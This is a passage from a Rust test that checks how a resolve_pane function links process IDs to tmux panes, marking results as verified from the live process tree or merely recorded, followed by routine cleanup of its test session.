            .lines()
            .find_map(|l| l.strip_prefix("PMBPID "))
            .and_then(|s| s.trim().parse().ok())
            .expect("nested pid");

        // No recorded tmux_pane at all: resolution must come from the live
        // process tree, and must be Verified rather than Recorded.
        let terminal = json!({ "pid": 999_999, "ppid_chain": [deep] });
        assert_eq!(
            resolve_pane(&terminal),
            Some((pane.clone(), PaneTrust::Verified))
        );
        // A dead pid with a live recorded pane resolves, but only weakly.
        let recorded = json!({ "pid": 999_999, "ppid_chain": [999_998], "tmux_pane": pane.0 });
        assert_eq!(
            resolve_pane(&recorded),
            Some((pane.clone(), PaneTrust::Recorded))
        );

        let _ = std::fs::remove_file(&script);
        let _ = run(&bin, &["kill-session", "-t", session]);
    }
}
